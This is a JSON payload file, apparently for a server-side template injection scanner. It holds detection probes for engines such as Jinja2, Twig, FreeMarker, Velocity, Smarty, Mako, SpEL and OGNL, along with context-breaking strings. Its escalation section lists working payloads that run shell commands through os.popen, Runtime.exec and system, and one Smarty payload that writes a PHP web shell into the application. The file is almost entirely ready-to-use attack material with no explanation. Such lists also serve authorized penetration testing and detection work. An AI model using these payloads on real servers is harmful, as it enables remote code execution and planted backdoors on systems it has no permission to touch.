{
  "probes": [
    { "payload": "{{7*7}}", "expected": "49", "engines": ["jinja2", "twig"] },
    { "payload": "{{7*'7'}}", "expected": "7777777", "engines": ["jinja2"] },
    { "payload": "${7*7}", "expected": "49", "engines": ["freemarker", "velocity"] },
    { "payload": "${{7*7}}", "expected": "49", "engines": ["freemarker"] },
    { "payload": "#{7*7}", "expected": "49", "engines": ["velocity", "thymeleaf", "spel"] },
    { "payload": "<%= 7*7 %>", "expected": "49", "engines": ["mako", "erb"] },
    { "payload": "{7*7}", "expected": "49", "engines": ["smarty"] },
    { "payload": "{{= 7*7}}", "expected": "49", "engines": ["twig"] },
    { "payload": "#set($x=7*7)${x}", "expected": "49", "engines": ["velocity"] },
    { "payload": "${7+7}", "expected": "14", "engines": ["freemarker", "velocity"] },
    { "payload": "{{7+7}}", "expected": "14", "engines": ["jinja2", "twig"] },
    { "payload": "#{T(java.lang.Math).random()}", "expected": "0\\.", "engines": ["spel"] },
    { "payload": "%{7*7}", "expected": "49", "engines": ["ognl"] },
    { "payload": "${#rt=@java.lang.Runtime@getRuntime()}", "expected": "", "engines": ["ognl"] }
  ],
  "context_breakers": [
    "}}",
    "%}",
    "#}",
    "-->",
    "*/",
    "\r\n",
    "--}}",
    "--%>",
    "%>}}"
  ],
  "escalation": {
    "jinja2": [
      "{{config}}",
      "{{config.items()}}",
      "{{self.__init__.__globals__.__builtins__}}",
      "{{''.__class__.__mro__[2].__subclasses__()}}",
      "{{request.environ}}",
      "{{''.__class__.__base__.__subclasses__()}}",
      "{{lipsum.__globals__['os'].popen('id').read()}}",
      "{{cycler.__init__.__globals__.os.popen('id').read()}}"
    ],
    "twig": [
      "{{_self.env.getFilter('system')}}",
      "{{_self.env.registerUndefinedFilterCallback('exec')}}",
      "{{['id']|filter('system')}}",
      "{{['id']|map('exec')|join}}"
    ],
    "freemarker": [
      "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
    ],
    "velocity": [
      "#set($rt=$class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null))$rt.exec('id')",
      "#set($str=$class.inspect('java.lang.String').type)"
    ],
    "smarty": [
      "{system('id')}",
      "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"
    ],
    "mako": [
      "<%import os%>${os.popen('id').read()}",
      "${self.module.cache.util.os.popen('id').read()}"
    ],
    "spel": [
      "#{T(java.lang.Runtime).getRuntime().exec('id')}",
      "#{T(java.lang.Runtime).getRuntime().exec(new String[]{'id'})}",
      "#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
    ],
    "ognl": [
      "%{(#rt=#@java.lang.Runtime@getRuntime().exec('id'))}",
      "%{#a=@java.lang.Runtime@getRuntime(),#a.exec('id')}",
      "${#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')}"
    ]
  }
}
